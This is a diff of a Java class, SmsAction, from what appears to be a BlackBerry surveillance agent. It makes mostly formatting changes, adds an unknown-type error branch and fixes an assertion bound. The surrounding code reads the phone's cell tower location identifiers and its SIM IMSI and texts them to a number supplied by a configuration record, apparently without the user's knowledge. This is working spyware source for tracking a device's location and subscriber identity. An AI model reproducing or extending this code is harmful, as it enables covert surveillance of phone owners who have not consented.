@@ -16,7 +16,6 @@ import javax.wireless.messaging.MessageConnection;
 import javax.wireless.messaging.TextMessage;
 
 import net.rim.device.api.system.CDMAInfo;
-import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
 import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
@@ -35,7 +34,7 @@ public final class SmsAction extends SubAction {
     private static final int TYPE_LOCATION = 1;
     private static final int TYPE_SIM = 2;
     private static final int TYPE_TEXT = 3;
-    
+
     String number;
     String text;
     int type;
@@ -66,44 +65,44 @@ public final class SmsAction extends SubAction {
 
         case TYPE_LOCATION:
             // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
-            
+
             getGPSPosition();
-            
+
             break;
         }
         return true;
     }
 
     private void getCellPosition() {
-        
+
         //#debug debug
         debug.trace("getCellPosition");
         String message;
-        
+
         boolean gprs = true;
-        if(gprs){
+        if (gprs) {
             // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
             // CC e MNC possono essere estratti da IMEI
             GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
-            
+
             int mcc = cellinfo.getMCC();
             int mnc = cellinfo.getMNC();
             int lac = cellinfo.getLAC();
             int cid = cellinfo.getCellId();
-            
+
             StringBuffer mb = new StringBuffer();
             mb.append("CC: " + mcc);
             mb.append(" MNC: " + mnc);
             mb.append(" LAC: " + lac);
             mb.append(" CID: " + cid);
             message = mb.toString();
-        }else{
+        } else {
             CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
-            
+
             int sid = cellinfo.getSID();
             int nid = cellinfo.getNID();
             int bid = cellinfo.getBID();
-            
+
             StringBuffer mb = new StringBuffer();
             mb.append("SID" + sid);
             mb.append(" NID: " + nid);
@@ -112,19 +111,16 @@ public final class SmsAction extends SubAction {
         }
         //#debug info
         debug.info(message);
-        
+
         sendSMS(message);
     }
 
     private void getGPSPosition() {
-        
-        
-        
         getCellPosition();
-        
+
     }
 
-    boolean sendSMS(String message) {
+    boolean sendSMS(final String message) {
 
         // #debug info
         debug.info("Sending sms to: " + number + " message:" + message);
@@ -163,7 +159,7 @@ public final class SmsAction extends SubAction {
             type = databuffer.readInt();
 
             //#ifdef DBC
-            Check.asserts(type > 1 && type <= 3, "wrong type");
+            Check.asserts(type >= 1 && type <= 3, "wrong type");
             //#endif
 
             int len = databuffer.readInt();
@@ -184,6 +180,10 @@ public final class SmsAction extends SubAction {
             case TYPE_SIM:
                 String imsi = Device.getInstance().getImsi();
                 text = "IMSI: " + imsi;
+                break;
+            default:
+                //#debug error
+                debug.error("SmsAction.parse,  Unknown type: " + type);
                 break;
             }
 
